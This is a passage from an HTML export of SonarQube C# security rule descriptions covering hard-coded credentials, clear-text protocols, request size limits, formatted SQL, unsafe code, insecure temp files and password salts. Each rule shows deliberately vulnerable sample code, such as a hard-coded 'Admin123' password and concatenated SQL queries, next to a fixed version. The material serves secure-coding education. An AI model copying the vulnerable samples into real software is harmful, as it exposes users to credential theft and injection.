  Security Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/409" rel="nofollow">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li><li> <a href="https://www.bamsoftware.com/hacks/zipbomb/" rel="nofollow">bamsoftware.com</a> - A better Zip Bomb </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2068">
              csharpsquid:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as &#34;oauthToken&#34;, &#34;secret&#34;, …​</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
string username &#61; &#34;admin&#34;;
string password &#61; &#34;Admin123&#34;; // Sensitive
string usernamePassword  &#61; &#34;user&#61;admin&amp;password&#61;Admin123&#34;; // Sensitive
string url &#61; &#34;scheme://user:Admin123&#64;domain.com&#34;; // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
string username &#61; &#34;admin&#34;;
string password &#61; GetEncryptedPassword();
string usernamePassword &#61; string.Format(&#34;user&#61;{0}&amp;password&#61;{1}&#34;, GetEncryptedUsername(), GetEncryptedPassword());
string url &#61; $&#34;scheme://{username}:{password}&#64;domain.com&#34;;

string url2 &#61; &#34;http://guest:guest&#64;domain.com&#34;; // Compliant
const string Password_Property &#61; &#34;custom.password&#34;; // Compliant
</pre>
<h2>Exceptions</h2>
<ul><li> Issue is not raised when URI username and password are the same. </li><li> Issue is not raised when searched pattern is found in variable name and value. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5332">
              csharpsquid:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul><li> sensitive data exposure </li><li> traffic redirected to a malicious endpoint </li><li> malware-infected software update or installer </li><li> execution of client-side code </li><li> corruption of critical information </li></ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul><li> bypassing isolation mechanisms </li><li> compromising a component of the network </li><li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li></ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http" rel="nofollow">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169" rel="nofollow">CVE-2019-6169</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327" rel="nofollow">CVE-2019-12327</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065" rel="nofollow">CVE-2019-11065</a> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li><li> Application data transits over an untrusted network. </li><li> Compliance rules require the service to encrypt data in transit. </li><li> Your application renders web pages with a relaxed mixed content policy. </li><li> OS-level protections against clear-text traffic are deactivated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul><li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li><li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li><li> Use <code>https</code> instead of <code>http</code>. </li><li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li></ul>  </li><li> Enable encryption of cloud components communications whenever it is possible. </li><li> Configure your application to block mixed content when rendering web pages. </li><li> If available, enforce OS-level deactivation of all clear-text traffic. </li></ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
var urlHttp &#61; &#34;http://example.com&#34;;                 // Noncompliant
var urlFtp &#61; &#34;ftp://anonymous&#64;example.com&#34;;         // Noncompliant
var urlTelnet &#61; &#34;telnet://anonymous&#64;example.com&#34;;   // Noncompliant
</pre>
<pre>
using var smtp &#61; new SmtpClient(&#34;host&#34;, 25); // Noncompliant, EnableSsl is not set
using var telnet &#61; new MyTelnet.Client(&#34;host&#34;, port); // Noncompliant, rule raises Security Hotspot on any member containing &#34;Telnet&#34;
</pre>
<h2>Compliant Solution</h2>
<pre>
var urlHttps &#61; &#34;https://example.com&#34;;
var urlSftp &#61; &#34;sftp://anonymous&#64;example.com&#34;;
var urlSsh &#61; &#34;ssh://anonymous&#64;example.com&#34;;
</pre>
<pre>
using var smtp &#61; new SmtpClient(&#34;host&#34;, 25) { EnableSsl &#61; true };
using var ssh &#61; new MySsh.Client(&#34;host&#34;, port);
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" rel="nofollow">Google, Moving towards more secure web</a> </li><li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/" rel="nofollow">Mozilla, Deprecating non secure http</a> </li><li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li><li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html" rel="nofollow">AWS
  Documentation</a> - Stream Encryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5693">
              csharpsquid:S5693
            </a>
          </td>
          <td>
            <details>
              <p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in
order to prevents DoS attacks.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> size limits are not defined for the different resources of the web application. </li><li> the web application is not protected by <a href="https://en.wikipedia.org/wiki/Rate_limiting" rel="nofollow">rate limiting</a> features. </li><li> the web application infrastructure has limited resources. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> For most of the features of an application, it is recommended to limit the size of requests to:
    <ul><li> lower or equal to 8mb for file uploads. </li><li> lower or equal to 2mb for other requests. </li></ul>  </li></ul>
<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>
<h2>Sensitive Code Example</h2>
<pre>
using Microsoft.AspNetCore.Mvc;

public class MyController : Controller
{
    [HttpPost]
    [DisableRequestSizeLimit] // Sensitive: No size  limit
    [RequestSizeLimit(10000000)] // Sensitive: 10MB is more than the recommended limit of 8MB
    public IActionResult PostRequest(Model model)
    {
    // ...
    }

    [HttpPost]
    [RequestFormLimits(MultipartBodyLengthLimit &#61; 8000000)] // Sensitive: 10MB is more than the recommended limit of 8MB
    public IActionResult MultipartFormRequest(Model model)
    {
    // ...
    }
}
</pre>
<p>In Web.config:</p>
<pre>
&lt;configuration&gt;
    &lt;system.web&gt;
        &lt;httpRuntime maxRequestLength&#61;&#34;81920&#34; executionTimeout&#61;&#34;3600&#34; /&gt;
        &lt;!-- Sensitive: maxRequestLength is exprimed in KB, so 81920KB &#61; 80MB  --&gt;
    &lt;/system.web&gt;
    &lt;system.webServer&gt;
        &lt;security&gt;
            &lt;requestFiltering&gt;
                &lt;requestLimits maxAllowedContentLength&#61;&#34;83886080&#34; /&gt;
                &lt;!-- Sensitive: maxAllowedContentLength is exprimed in bytes, so 83886080B &#61; 80MB  --&gt;
            &lt;/requestFiltering&gt;
        &lt;/security&gt;
    &lt;/system.webServer&gt;
&lt;/configuration&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
using Microsoft.AspNetCore.Mvc;

public class MyController : Controller
{
    [HttpPost]
    [RequestSizeLimit(8000000)] // Compliant: 8MB
    public IActionResult PostRequest(Model model)
    {
    // ...
    }

    [HttpPost]
    [RequestFormLimits(MultipartBodyLengthLimit &#61; 8000000)] // Compliant: 8MB
    public IActionResult MultipartFormRequest(Model model)
    {
    // ...
    }
}
</pre>
<p>In Web.config:</p>
<pre>
&lt;configuration&gt;
    &lt;system.web&gt;
        &lt;httpRuntime maxRequestLength&#61;&#34;8192&#34; executionTimeout&#61;&#34;3600&#34; /&gt;
        &lt;!-- Compliant: maxRequestLength is exprimed in KB, so 8192KB &#61; 8MB  --&gt;
    &lt;/system.web&gt;
    &lt;system.webServer&gt;
        &lt;security&gt;
            &lt;requestFiltering&gt;
                &lt;requestLimits maxAllowedContentLength&#61;&#34;8388608&#34; /&gt;
                &lt;!-- Comliant: maxAllowedContentLength is exprimed in bytes, so 8388608B &#61; 8MB  --&gt;
            &lt;/requestFiltering&gt;
        &lt;/security&gt;
    &lt;/system.webServer&gt;
&lt;/configuration&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html" rel="nofollow">Owasp Cheat Sheet</a> - Owasp Denial of Service
  Cheat Sheet </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/770" rel="nofollow">MITRE, CWE-770</a> - Allocation of Resources Without Limits or Throttling </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li><li> <a href="https://docs.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config" rel="nofollow">Web.config</a> - XML-formatted config file for IIS
  applications </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2077">
              csharpsquid:S2077
            </a>
          </td>
          <td>
            <details>
              <p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the
query. However, this rule doesn’t detect SQL injections (unlike rule <a href="/organizations/sopra-steria/rules?open&#61;csharpsquid%3AS3649&amp;rule_key&#61;csharpsquid%3AS3649" rel="nofollow">S3649</a>), the goal is only to highlight complex/formatted
queries.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Some parts of the query come from untrusted values (like user inputs). </li><li> The query is repeated/duplicated in other parts of the code. </li><li> The application must support different types of relational databases. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use <a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html" rel="nofollow">parameterized queries, prepared
  statements, or stored procedures</a> and bind variables to SQL query parameters. </li><li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
public void Foo(DbContext context, string query, string param)
{
    string sensitiveQuery &#61; string.Concat(query, param);
    context.Database.ExecuteSqlCommand(sensitiveQuery); // Sensitive
    context.Query&lt;User&gt;().FromSql(sensitiveQuery); // Sensitive

    context.Database.ExecuteSqlCommand($&#34;SELECT * FROM mytable WHERE mycol&#61;{value}&#34;, param); // Sensitive, the FormattableString is evaluated and converted to RawSqlString
    string query &#61; $&#34;SELECT * FROM mytable WHERE mycol&#61;{param}&#34;;
    context.Database.ExecuteSqlCommand(query); // Sensitive, the FormattableString has already been evaluated, it won&#39;t be converted to a parametrized query.
}

public void Bar(SqlConnection connection, string param)
{
    SqlCommand command;
    string sensitiveQuery &#61; string.Format(&#34;INSERT INTO Users (name) VALUES (\&#34;{0}\&#34;)&#34;, param);
    command &#61; new SqlCommand(sensitiveQuery); // Sensitive

    command.CommandText &#61; sensitiveQuery; // Sensitive

    SqlDataAdapter adapter;
    adapter &#61; new SqlDataAdapter(sensitiveQuery, connection); // Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void Foo(DbContext context, string query, string param)
{
    context.Database.ExecuteSqlCommand(&#34;SELECT * FROM mytable WHERE mycol&#61;&#64;p0&#34;, param); // Compliant, it&#39;s a parametrized safe query
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/89" rel="nofollow">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command
  </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> Derived from FindSecBugs rules <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA" rel="nofollow">Potential SQL/JPQL Injection
  (JPA)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO" rel="nofollow">Potential SQL/JDOQL Injection (JDO)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE" rel="nofollow">Potential SQL/HQL Injection (Hibernate)</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S6640">
              csharpsquid:S6640
            </a>
          </td>
          <td>
            <details>
              <p>Using <code>unsafe</code> code blocks can lead to unintended security or stability risks.</p>
<p><code>unsafe</code> code blocks allow developers to use features such as pointers, fixed buffers, function calls through pointers and manual memory
management. Such features may be necessary for interoperability with native libraries, as these often require pointers. It may also increase
performance in some critical areas, as certain bounds checks are not executed in an unsafe context.</p>
<p><code>unsafe</code> code blocks aren’t necessarily dangerous, however, the contents of such blocks are not verified by the Common Language Runtime.
Therefore, it is up to the programmer to ensure that no bugs are introduced through manual memory management or casting. If not done correctly, then
those bugs can lead to memory corruption vulnerabilities such as stack overflows. <code>unsafe</code> code blocks should be used with caution because
of these security and stability risks.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> There are any pointers or fixed buffers declared within the <code>unsafe</code> code block. </li></ul>
<p>There is a risk if you answered yes to the question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Unless absolutely necessary, do not use <code>unsafe</code> code blocks. If <code>unsafe</code> is used to increase performance, then the <a href="https://learn.microsoft.com/en-us/dotnet/standard/memory-and-spans/" rel="nofollow">Span and Memory APIs</a> may serve a similar purpose in a safe context.</p>
<p>If it is not possible to remove the code block, then it should be kept as short as possible. Doing so reduces risk, as there is less code that can
potentially introduce new bugs. Within the <code>unsafe</code> code block, make sure that:</p>
<ul><li> All type casts are correct. </li><li> Memory is correctly allocated and then released. </li><li> Array accesses can never go out of bounds. </li></ul>
<h2>Sensitive Code Example</h2>
<pre data-diff-id="1" data-diff-type="noncompliant">
public unsafe int SubarraySum(int[] array, int start, int end)  // Sensitive
{
    var sum &#61; 0;

    // Skip array bound checks for extra performance
    fixed (int* firstNumber &#61; array)
    {
        for (int i &#61; start; i &lt; end; i&#43;&#43;)
            sum &#43;&#61; *(firstNumber &#43; i);
    }

    return sum;
}
</pre>
<h2>Compliant Solution</h2>
<pre data-diff-id="1" data-diff-type="compliant">
public int SubarraySum(int[] array, int start, int end)
{
    var sum &#61; 0;

    Span&lt;int&gt; span &#61; array.AsSpan();
    for (int i &#61; start; i &lt; end; i&#43;&#43;)
        sum &#43;&#61; span[i];

    return sum;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/787.html" rel="nofollow">MITRE, CWE-787</a> - Out-of-bounds Write </li><li> <a href="https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/unsafe-code" rel="nofollow">Microsoft Learn</a> - Unsafe code, pointer types, and
  function pointers </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5443">
              csharpsquid:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451" rel="nofollow">CVE-2012-2451</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838" rel="nofollow">CVE-2015-1838</a> </li></ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code>, <code>TMPDIR</code> and
<code>TEMP</code>.</p>
<ul><li> <code>/tmp</code> </li><li> <code>/var/tmp</code> </li><li> <code>/usr/tmp</code> </li><li> <code>/dev/shm</code> </li><li> <code>/dev/mqueue</code> </li><li> <code>/run/lock</code> </li><li> <code>/var/run/lock</code> </li><li> <code>/Library/Caches</code> </li><li> <code>/Users/Shared</code> </li><li> <code>/private/tmp</code> </li><li> <code>/private/var/tmp</code> </li><li> <code>\Windows\Temp</code> </li><li> <code>\Temp</code> </li><li> <code>\TMP</code> </li><li> <code>%USERPROFILE%\AppData\Local\Temp</code> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Files are read from or written into a publicly writable folder </li><li> The application creates files with predictable names into a publicly writable folder </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Out of the box, .NET is missing secure-by-design APIs to create temporary files. To overcome this, one of the following options can be used:</p>
<ul><li> Use a dedicated sub-folder with tightly controlled permissions </li><li> Created temporary files in a publicly writable folder and make sure:
    <ul><li> Generated filename is unpredictable </li><li> File is readable and writable only by the creating user ID </li><li> File descriptor is not inherited by child processes </li><li> File is destroyed as soon as it is closed </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
using var writer &#61; new StreamWriter(&#34;/tmp/f&#34;); // Sensitive
</pre>
<pre>
var tmp &#61; Environment.GetEnvironmentVariable(&#34;TMP&#34;); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
var randomPath &#61; Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());

// Creates a new file with write, non inheritable permissions which is deleted on close.
using var fileStream &#61; new FileStream(randomPath, FileMode.CreateNew, FileAccess.Write, FileShare.None, 4096, FileOptions.DeleteOnClose);
using var writer &#61; new StreamWriter(fileStream);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/377" rel="nofollow">MITRE, CWE-377</a> - Insecure Temporary File </li><li> <a href="https://cwe.mitre.org/data/definitions/379" rel="nofollow">MITRE, CWE-379</a> - Creation of Temporary File in Directory with Incorrect Permissions
  </li><li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File" rel="nofollow">OWASP, Insecure Temporary File</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S5445">
              csharpsquid:S5445
            </a>
          </td>
          <td>
            <details>
              <p>Temporary files are considered insecurely created when the file existence check is performed separately from the actual file creation. Such a
situation can occur when creating temporary files using normal file handling functions or when using dedicated temporary file handling functions that
are not atomic.</p>
<h2>Why is this an issue?</h2>
<p>Creating temporary files in a non-atomic way introduces race condition issues in the application’s behavior. Indeed, a third party can create a
given file between when the application chooses its name and when it creates it.</p>
<p>In such a situation, the application might use a temporary file that it does not entirely control. In particular, this file’s permissions might be
different than expected. This can lead to trust boundary issues.</p>
<h3>What is the potential impact?</h3>
<p>Attackers with control over a temporary file used by a vulnerable application will be able to modify it in a way that will affect the application’s
logic. By changing this file’s Access Control List or other operating system-level properties, they could prevent the file from being deleted or
emptied. They may also alter the file’s content before or while the application uses it.</p>
<p>Depending on why and how the affected temporary files are used, the exploitation of a race condition in an application can have various
consequences. They can range from sensitive information disclosure to more serious application or hosting infrastructure compromise.</p>
<h4>Information disclosure</h4>
<p>Because attackers can control the permissions set on temporary files and prevent their removal, they can read what the application stores in them.
This might be especially critical if this information is sensitive.</p>
<p>For example, an application might use temporary files to store users&#39; session-related information. In such a case, attackers controlling those
files can access session-stored information. This might allow them to take over authenticated users&#39; identities and entitlements.</p>
<h4>Attack surface extension</h4>
<p>An application might use temporary files to store technical data for further reuse or as a communication channel between multiple components. In
that case, it might consider those files part of the trust boundaries and use their content without additional security validation or sanitation. In
such a case, an attacker controlling the file content might use it as an attack vector for further compromise.</p>
<p>For example, an application might store serialized data in temporary files for later use. In such a case, attackers controlling those files&#39;
content can change it in a way that will lead to an insecure deserialization exploitation. It might allow them to execute arbitrary code on the
application hosting server and take it over.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code example is vulnerable to a race condition attack because it creates a temporary file using an unsafe API function.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.IO;

public void Example()
{
    var tempPath &#61; Path.GetTempFileName();  // Noncompliant

    using (var writer &#61; new StreamWriter(tempPath))
    {
        writer.WriteLine(&#34;content&#34;);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
using System.IO;

public void Example()
{
    var randomPath &#61; Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());

    using (var fileStream &#61; new FileStream(randomPath, FileMode.CreateNew, FileAccess.Write, FileShare.None, 4096, FileOptions.DeleteOnClose))
    using (var writer &#61; new StreamWriter(fileStream))
    {
        writer.WriteLine(&#34;content&#34;);
    }
}
</pre>
<h3>How does this work?</h3>
<p>Applications should create temporary files so that no third party can read or modify their content. It requires that the files&#39; name, location, and
permissions are carefully chosen and set. This can be achieved in multiple ways depending on the applications&#39; technology stacks.</p>
<h4>Strong security controls</h4>
<p>Temporary files can be created using unsafe functions and API as long as strong security controls are applied. Non-temporary file-handling
functions and APIs can also be used for that purpose.</p>
<p>In general, applications should ensure that attackers can not create a file before them. This turns into the following requirements when creating
the files:</p>
<ul><li> Files should be created in a non-public directory. </li><li> File names should be unique. </li><li> File names should be unpredictable. They should be generated using a cryptographically secure random generator. </li><li> File creation should fail if a target file already exists. </li></ul>
<p>Moreover, when possible, it is recommended that applications destroy temporary files after they have finished using them.</p>
<p>Here the example compliant code uses the <code>Path.GetTempPath</code> and <code>Path.GetRandomFileName</code> functions to generate a unique
random file name. The file is then open with the <code>FileMode.CreateNew</code> option that will ensure the creation fails if the file already
exists. The <code>FileShare.None</code> option will additionally prevent the file from being opened again by any process. To finish, this code ensures
the file will get destroyed once the application has finished using it with the <code>FileOptions.DeleteOnClose</code> option.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File" rel="nofollow">OWASP</a> - Insecure Temporary File </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP</a> - Top 10 2021 - A01:2021 - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP</a> - Top 10 2017 - A9:2017 -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/377" rel="nofollow">MITRE</a> - CWE-377: Insecure Temporary File </li><li> <a href="https://cwe.mitre.org/data/definitions/379" rel="nofollow">MITRE</a> - CWE-379: Creation of Temporary File in Directory with Incorrect Permissions
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S2053">
              csharpsquid:S2053
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>
<h2>Why is this an issue?</h2>
<p>During the process of password hashing, an additional component, known as a &#34;salt,&#34; is often integrated to bolster the overall security. This salt,
acting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>
<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it
is too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.
Similarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical
password hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on
implementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>
<h3>What is the potential impact?</h3>
<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.
This could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>
<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying
every possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt
can make the task significantly easier and faster.</p>
<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully
cracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>
<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters
of password hashes with identical salt that can then be attacked as explained before.</p>
